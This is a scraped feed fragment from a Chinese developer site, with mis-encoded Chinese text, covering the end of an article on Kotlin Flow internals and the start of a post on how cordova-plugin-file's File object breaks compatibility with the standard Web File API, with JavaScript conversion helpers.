<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: <span class="hljs-built_in">Unit</span> {
    <span class="hljs-comment">// åˆ›å»ºåç¨‹ Continuation</span>
    <span class="hljs-keyword">return</span> suspendCoroutineUninterceptedOrReturn { cont -&gt;
        <span class="hljs-comment">// å°† Flow æ”¶é›†è½¬æ¢ä¸ºåç¨‹æŒ‚èµ·ç‚¹</span>
        <span class="hljs-keyword">val</span> completion = <span class="hljs-keyword">object</span> : Continuation&lt;<span class="hljs-built_in">Unit</span>&gt; {
            <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> context: CoroutineContext = cont.context
            
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resumeWith</span><span class="hljs-params">(result: <span class="hljs-type">Result</span>&lt;<span class="hljs-type">Unit</span>&gt;)</span></span> {
                <span class="hljs-comment">// å°†ç»“æœä¼ é€’ç»™åŸå§‹ Continuation</span>
                cont.resumeWith(result)
            }
        }
        
        <span class="hljs-comment">// å¯åŠ¨ Flow æ”¶é›†</span>
        startCollect(collector, completion)
    }
}
</code></pre>
<h4 data-id="heading-47">9.2 Flow çš„å–æ¶ˆæœºåˆ¶</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Flow çš„å–æ¶ˆæ£€æŸ¥</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
    <span class="hljs-comment">// åŒ…è£…æ”¶é›†å™¨ä»¥æ”¯æŒå–æ¶ˆ</span>
    <span class="hljs-keyword">val</span> cancellableCollector = CancellableFlowCollector(collector)
    
    <span class="hljs-keyword">try</span> {
        collectSafely(cancellableCollector)
    } <span class="hljs-keyword">finally</span> {
        cancellableCollector.releaseCancellability()
    }
}

<span class="hljs-comment">// å¯å–æ¶ˆçš„æ”¶é›†å™¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CancellableFlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> collector: FlowCollector&lt;T&gt;
) : FlowCollector&lt;T&gt; {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cancellationCause: Throwable? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²å–æ¶ˆ</span>
        <span class="hljs-keyword">if</span> (cancellationCause != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> CancellationException()
        }
        
        <span class="hljs-comment">// æ£€æŸ¥åç¨‹æ˜¯å¦æ´»è·ƒ</span>
        ensureActive()
        
        <span class="hljs-comment">// å®é™…å‘å°„</span>
        collector.emit(value)
    }
}
</code></pre>
<h3 data-id="heading-48">10. æ€§èƒ½ä¼˜åŒ–ç»†èŠ‚</h3>
<h4 data-id="heading-49">10.1 Flow çš„èåˆï¼ˆFusionï¼‰ä¼˜åŒ–</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Flow æ“ä½œç¬¦çš„èåˆä¼˜åŒ–</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">FusibleFlow</span>&lt;<span class="hljs-type">T</span>&gt; : <span class="hljs-type">Flow</span>&lt;<span class="hljs-type">T</span>&gt; {
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fuse</span><span class="hljs-params">(
        context: <span class="hljs-type">CoroutineContext</span> = EmptyCoroutineContext,
        capacity: <span class="hljs-type">Int</span> = Channel.OPTIONAL_CHANNEL,
        onBufferOverflow: <span class="hljs-type">BufferOverflow</span> = BufferOverflow.SUSPEND
    )</span></span>: Flow&lt;T&gt;
}

<span class="hljs-comment">// ç¤ºä¾‹ï¼šè¿ç»­ map æ“ä½œçš„èåˆ</span>
flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
    .map { it * <span class="hljs-number">2</span> }    <span class="hljs-comment">// è¿™ä¸¤ä¸ª map å¯èƒ½è¢«èåˆä¸º</span>
    .map { it + <span class="hljs-number">1</span> }    <span class="hljs-comment">// ä¸€ä¸ª map { (it * 2) + 1 }</span>
    .collect { ... }

<span class="hljs-comment">// èåˆåçš„ä¼ªä»£ç </span>
flow {
    collect { value -&gt;
        <span class="hljs-comment">// èåˆåçš„è½¬æ¢</span>
        <span class="hljs-keyword">val</span> transformed = (value * <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>
        emit(transformed)
    }
}
</code></pre>
<h4 data-id="heading-50">10.2 å†…è”ä¼˜åŒ–</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// è®¸å¤š Flow æ“ä½œç¬¦ä½¿ç”¨ inline ä¼˜åŒ–</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">filter</span><span class="hljs-params">(
    <span class="hljs-keyword">crossinline</span> predicate: <span class="hljs-type">suspend</span> (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>
)</span></span>: Flow&lt;T&gt; = flow {  <span class="hljs-comment">// inline å‡½æ•°ï¼Œå‡å°‘ lambda å¯¹è±¡åˆ›å»º</span>
    collect { value -&gt;
        <span class="hljs-keyword">if</span> (predicate(value)) emit(value)
    }
}

<span class="hljs-comment">// æœªå†…è”çš„æƒ…å†µï¼ˆæ€§èƒ½è¾ƒå·®ï¼‰ï¼š</span>
<span class="hljs-comment">// 1. åˆ›å»º lambda å¯¹è±¡</span>
<span class="hljs-comment">// 2. åˆ›å»ºæ–°çš„ Flow å¯¹è±¡</span>
<span class="hljs-comment">// 3. é¢å¤–çš„å‡½æ•°è°ƒç”¨å¼€é”€</span>

<span class="hljs-comment">// å†…è”ä¼˜åŒ–åï¼š</span>
<span class="hljs-comment">// 1. ä»£ç ç›´æ¥åµŒå…¥è°ƒç”¨å¤„</span>
<span class="hljs-comment">// 2. å‡å°‘å¯¹è±¡åˆ›å»º</span>
<span class="hljs-comment">// 3. æ›´å¥½çš„ JIT ä¼˜åŒ–æœºä¼š</span>
</code></pre>
<h4 data-id="heading-51">11. æ€»ç»“</h4>
<p>Kotlin Flow çš„æ ¸å¿ƒåŸç†ï¼š</p>
<ol>
<li><strong>åŸºäºåç¨‹</strong>ï¼šåˆ©ç”¨æŒ‚èµ·å‡½æ•°å®ç°å¼‚æ­¥æµå¤„ç†</li>
<li><strong>å†·æµæ¨¡å‹</strong>ï¼šæ¯æ¬¡æ”¶é›†éƒ½åˆ›å»ºæ–°çš„æ‰§è¡Œ</li>
<li><strong>è£…é¥°å™¨æ¨¡å¼</strong>ï¼šæ“ä½œç¬¦é€šè¿‡åŒ…è£…å®ç°é“¾å¼è°ƒç”¨</li>
<li><strong>ç»“æ„åŒ–å¹¶å‘</strong>ï¼šè‡ªåŠ¨ç®¡ç†èµ„æºç”Ÿå‘½å‘¨æœŸ</li>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šé€šè¿‡ SafeCollector ç¡®ä¿ä¸Šä¸‹æ–‡ä¸€è‡´æ€§</li>
<li><strong>èƒŒå‹å¤„ç†</strong>ï¼šåŸºäº Channel çš„ç¼“å†²æœºåˆ¶</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Cordova Plugin File çš„ File å¯¹è±¡è®¾è®¡ç¼ºé™·]]></title>    <link>https://juejin.cn/post/7600588379104854068</link>    <guid>https://juejin.cn/post/7600588379104854068</guid>    <pubDate>2026-01-29T08:42:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600588379104854068" data-draft-id="7600345782174122018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Cordova Plugin File çš„ File å¯¹è±¡è®¾è®¡ç¼ºé™·"/> <meta itemprop="keywords" content="Android,APP,å®¢æˆ·ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T08:42:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gemini001"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Cordova Plugin File çš„ File å¯¹è±¡è®¾è®¡ç¼ºé™·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gemini001
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:42:05.000Z" title="Thu Jan 29 2026 08:42:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Cordova Plugin File çš„ File å¯¹è±¡è®¾è®¡ç¼ºé™·ï¼šä¸€åœº Web æ ‡å‡†çš„ç¾éš¾</h2>
<h3 data-id="heading-1">ğŸš¨ é—®é¢˜æ¦‚è¿°</h3>
<p>Cordova çš„Â <code>cordova-plugin-file</code>æ’ä»¶è¦†ç›–äº†å…¨å±€çš„Â <code>File</code>æ„é€ å‡½æ•°ï¼Œåˆ›é€ äº†ä¸€ä¸ª<strong>å››ä¸åƒçš„æ–‡ä»¶å¯¹è±¡</strong>ï¼šæ—¢ä¸æ˜¯çœŸæ­£çš„ Web Fileï¼Œä¹Ÿä¸æ˜¯å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿæ¥å£ï¼Œå¯¼è‡´å¤§é‡ H5 ä»£ç å¼‚å¸¸ã€‚
æ’ä»¶åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fcordova-plugin-file%2Fblob%2Fmaster%2Fwww%2FFile.js" target="_blank" title="https://github.com/apache/cordova-plugin-file/blob/master/www/File.js" ref="nofollow noopener noreferrer">github.com/apache/cordâ€¦</a></p>
<h3 data-id="heading-2">ğŸ“Š æ ¸å¿ƒç‰¹æ€§å¯¹æ¯”ï¼šCordova File vs æ ‡å‡† Web File</h3>



























































<table><thead><tr><th>ç‰¹æ€§</th><th>Cordova File</th><th>æ ‡å‡† Web File</th><th>å®é™…å½±å“</th></tr></thead><tbody><tr><td><strong>EXIF æ•°æ®</strong>â€‹</td><td>âŒ ä¸åŒ…å«</td><td>âœ… å¯èƒ½åŒ…å«</td><td>æ— æ³•è¯»å–ç…§ç‰‡æ‹æ‘„ä¿¡æ¯</td></tr><tr><td><strong>IPTC æ•°æ®</strong>â€‹</td><td>âŒ ä¸åŒ…å«</td><td>âœ… å¯èƒ½åŒ…å«</td><td>æ— æ³•è¯»å–å›¾ç‰‡å…ƒæ•°æ®</td></tr><tr><td><strong>æœ¬åœ°è·¯å¾„</strong>â€‹</td><td>âœ… localURL</td><td>âŒ æ— </td><td>Cordova ç‹¬æœ‰ä¼˜åŠ¿</td></tr><tr><td><strong>åˆ‡ç‰‡æ”¯æŒ</strong>â€‹</td><td>âœ… start/end</td><td>âœ… slice()</td><td>ä¸¤è€…éƒ½æ”¯æŒï¼Œä½† API ä¸åŒ</td></tr><tr><td><strong>äºŒè¿›åˆ¶è¯»å–</strong>â€‹</td><td>âœ… é€šè¿‡ FileReader</td><td>âœ… é€šè¿‡ FileReader</td><td>åŸºç¡€åŠŸèƒ½ä¸€è‡´</td></tr><tr><td><strong>æ„é€ å‡½æ•°</strong>â€‹</td><td><code>File(name, localURL, type, lastModifiedDate, size)</code></td><td><code>File(fileBits, fileName, options)</code></td><td>å®Œå…¨ä¸å…¼å®¹</td></tr><tr><td><strong>instanceof File</strong>â€‹</td><td>âŒ false</td><td>âœ… true</td><td>ç±»å‹æ£€æµ‹å¤±æ•ˆ</td></tr><tr><td><strong>ç»§æ‰¿å…³ç³»</strong>â€‹</td><td>ä¸ç»§æ‰¿ Blob</td><td>ç»§æ‰¿è‡ª Blob</td><td>å¤±å» Blob èƒ½åŠ›</td></tr></tbody></table>
<h3 data-id="heading-3">ğŸ’¡ å…³é”®æ´å¯Ÿ</h3>
<h4 data-id="heading-4">Cordova File çš„"ä¼ªä¼˜åŠ¿"</h4>
<ul>
<li><strong>æœ¬åœ°è·¯å¾„ (localURL)</strong> ï¼šè¿™æ˜¯ Cordova File ç‹¬æœ‰çš„ä¼˜åŠ¿ï¼Œå¯ä»¥ç›´æ¥è®¿é—®è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿ</li>
<li><strong>å†…ç½®åˆ‡ç‰‡ (start/end)</strong> ï¼šæä¾›äº†æ–‡ä»¶èŒƒå›´å®šä½ï¼Œé€‚åˆå¤§æ–‡ä»¶å¤„ç†</li>
</ul>
<h4 data-id="heading-5">æ ‡å‡† Web File çš„çœŸæ­£ä»·å€¼</h4>
<ul>
<li><strong>EXIF/IPTC æ•°æ®</strong>ï¼šå¯¹å›¾ç‰‡å¤„ç†åº”ç”¨è‡³å…³é‡è¦</li>
<li><strong>æ ‡å‡†å…¼å®¹æ€§</strong>ï¼šä¸æ•´ä¸ª Web ç”Ÿæ€æ— ç¼é›†æˆ</li>
<li><strong>Blob ç»§æ‰¿</strong>ï¼šè·å¾—æ‰€æœ‰ Blob æ–¹æ³•ï¼ˆ<code>slice()</code>,Â <code>stream()</code>,Â <code>text()</code>,Â <code>arrayBuffer()</code>ï¼‰</li>
</ul>
<h3 data-id="heading-6">ğŸ’¥ å®é™…å¼€å‘ä¸­çš„ç—›ç‚¹</h3>
<h4 data-id="heading-7">1. å›¾ç‰‡åº”ç”¨å´©æºƒ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ğŸ˜± æƒ³è¯»å–ç…§ç‰‡çš„ EXIF ä¿¡æ¯ï¼Ÿ</span>
<span class="hljs-keyword">const</span> cordovaFile = <span class="hljs-title function_">getSelectedFile</span>(); <span class="hljs-comment">// Cordova File å¯¹è±¡</span>

<span class="hljs-comment">// æœŸæœ›è¿™æ ·è¯»å– EXIF</span>
<span class="hljs-variable constant_">EXIF</span>.<span class="hljs-title function_">getData</span>(cordovaFile, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> cameraModel = <span class="hljs-variable constant_">EXIF</span>.<span class="hljs-title function_">getTag</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">'Model'</span>); <span class="hljs-comment">// undefined!</span>
});

<span class="hljs-comment">// æœŸæœ›è¿™æ ·è¯»å– IPTC  </span>
<span class="hljs-title function_">readIPTCData</span>(cordovaFile); <span class="hljs-comment">// å¤±è´¥ï¼æ²¡æœ‰åŸå§‹å›¾åƒæ•°æ®</span>
</code></pre>
<h4 data-id="heading-8">2. ç¬¬ä¸‰æ–¹åº“é›†ä½“å¤±æ•ˆ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ğŸ“¦ å›¾ç‰‡å¤„ç†åº“å…¨éƒ¨æ‡µé€¼</span>
<span class="hljs-keyword">import</span> imageOptimizer <span class="hljs-keyword">from</span> <span class="hljs-string">'image-optimizer'</span>;    <span class="hljs-comment">// âŒ æ— æ³•è¯»å– EXIF</span>
<span class="hljs-keyword">import</span> watermarkAdder <span class="hljs-keyword">from</span> <span class="hljs-string">'watermark-js'</span>;       <span class="hljs-comment">// âŒ æ— æ³•æ­£ç¡®å¤„ç†</span>
<span class="hljs-keyword">import</span> exifReader <span class="hljs-keyword">from</span> <span class="hljs-string">'exif-reader'</span>;            <span class="hljs-comment">// âŒ æ‰¾ä¸åˆ° EXIF æ•°æ®</span>

<span class="hljs-comment">// å› ä¸ºè¿™äº›åº“éƒ½æœŸæœ›æ ‡å‡† File å¯¹è±¡</span>
</code></pre>
<h4 data-id="heading-9">3. ç±»å‹æ£€æµ‹æ··ä¹±</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processFile</span>(<span class="hljs-params">file</span>) {
    <span class="hljs-keyword">if</span> (file <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">File</span>) {
        <span class="hljs-comment">// æ ‡å‡†ç¯å¢ƒï¼šè¿›å…¥è¿™é‡Œ âœ…</span>
        <span class="hljs-comment">// Cordova ç¯å¢ƒï¼šè¿›ä¸æ¥ âŒ</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¤„ç†æ ‡å‡†æ–‡ä»¶'</span>);
    }
    
    <span class="hljs-keyword">if</span> (file.<span class="hljs-property">localURL</span>) {
        <span class="hljs-comment">// åªæœ‰ Cordova File æœ‰è¿™ä¸ªå±æ€§</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿™æ˜¯ Cordova æ–‡ä»¶ï¼Œä½†æˆ‘ä¸è®¤è¯†å®ƒï¼'</span>);
    }
}
</code></pre>
<h3 data-id="heading-10">ğŸ”§ å®ç”¨è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-11">æ–¹æ¡ˆ1ï¼šä¿ç•™ Cordova ä¼˜åŠ¿ï¼Œä¿®å¤æ ‡å‡†å…¼å®¹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartFileBridge</span> {
    <span class="hljs-comment">// æ£€æµ‹æ–‡ä»¶ç±»å‹</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">detectType</span>(<span class="hljs-params">file</span>) {
        <span class="hljs-keyword">if</span> (file.<span class="hljs-property">localURL</span> &amp;&amp; !file.<span class="hljs-property">slice</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'cordova'</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">File</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'standard'</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">'unknown'</span>;
    }
    
    <span class="hljs-comment">// è½¬æ¢ä¸ºæ ‡å‡† Fileï¼ˆä¿ç•™ EXIF/IPTC è¯»å–èƒ½åŠ›ï¼‰</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">toStandardFile</span>(<span class="hljs-params">cordovaFile</span>) {
        <span class="hljs-comment">// å…³é”®ï¼šé€šè¿‡ FileReader è¯»å–å®Œæ•´äºŒè¿›åˆ¶æ•°æ®</span>
        <span class="hljs-keyword">const</span> arrayBuffer = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">readAsArrayBuffer</span>(cordovaFile);
        
        <span class="hljs-comment">// åˆ›å»ºæ ‡å‡† Fileï¼Œè¿™æ ·å°±èƒ½è¯»å– EXIF/IPTC äº†</span>
        <span class="hljs-keyword">const</span> standardFile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>([arrayBuffer], cordovaFile.<span class="hljs-property">name</span>, {
            <span class="hljs-attr">type</span>: cordovaFile.<span class="hljs-property">type</span>,
            <span class="hljs-attr">lastModified</span>: cordovaFile.<span class="hljs-property">lastModifiedDate</span>?.<span class="hljs-title function_">getTime</span>()
        });
        
        <span class="hljs-comment">// ä¿ç•™ Cordova çš„æœ¬åœ°è·¯å¾„ä¿¡æ¯</span>
        standardFile.<span class="hljs-property">localURL</span> = cordovaFile.<span class="hljs-property">localURL</span>;
        standardFile.<span class="hljs-property">start</span> = cordovaFile.<span class="hljs-property">start</span>;
        standardFile.<span class="hljs-property">end</span> = cordovaFile.<span class="hljs-property">end</span>;
        
        <span class="hljs-keyword">return</span> standardFile;
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">readAsArrayBuffer</span>(<span class="hljs-params">file</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>();
            reader.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(reader.<span class="hljs-property">result</span>);
            reader.<span class="hljs-property">onerror</span> = reject;
            reader.<span class="hljs-title function_">readAsArrayBuffer</span>(file);
        });
    }
}
</code></pre>
<h4 data-id="heading-12">æ–¹æ¡ˆ2ï¼šæ™ºèƒ½æ–‡ä»¶å¤„ç†å™¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IntelligentFileProcessor</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">file</span>) {
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">type</span> = <span class="hljs-title class_">SmartFileBridge</span>.<span class="hljs-title function_">detectType</span>(file);
        
        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">type</span>) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">'cordova'</span>:
                <span class="hljs-comment">// Cordova æ–‡ä»¶ï¼šè½¬æ¢ä¸ºæ ‡å‡† File ä»¥å¯ç”¨ EXIF/IPTC è¯»å–</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title class_">SmartFileBridge</span>.<span class="hljs-title function_">toStandardFile</span>(file);
                
            <span class="hljs-keyword">case</span> <span class="hljs-string">'standard'</span>:
                <span class="hljs-comment">// æ ‡å‡†æ–‡ä»¶ï¼šç›´æ¥ä½¿ç”¨</span>
                <span class="hljs-keyword">return</span> file;
                
            <span class="hljs-attr">default</span>:
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æœªçŸ¥æ–‡ä»¶ç±»å‹'</span>);
        }
    }
    
    <span class="hljs-comment">// ä¸“é—¨å¤„ç†å›¾ç‰‡æ–‡ä»¶çš„ EXIF</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">processImageWithExif</span>(<span class="hljs-params">file</span>) {
        <span class="hljs-keyword">const</span> processedFile = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">process</span>(file);
        
        <span class="hljs-comment">// ç°åœ¨å¯ä»¥å®‰å…¨è¯»å– EXIF äº†</span>
        <span class="hljs-keyword">if</span> (processedFile.<span class="hljs-property">type</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'image/'</span>)) {
